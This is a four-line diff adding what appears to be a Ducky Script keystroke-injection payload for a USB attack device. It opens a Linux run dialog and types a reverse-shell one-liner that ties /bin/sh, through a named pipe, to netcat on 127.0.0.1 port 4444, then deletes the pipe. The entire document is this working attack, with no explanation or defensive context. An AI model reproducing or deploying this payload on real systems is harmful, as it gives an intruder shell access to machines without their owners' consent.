@@ -1,0 +1,4 @@
+ALT F2
+DELAY 500
+STRING /bin/sh -c "mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 127.0.0.1 4444 1>/tmp/backpipe & rm -f /tmp/backpipe"
+ENTER
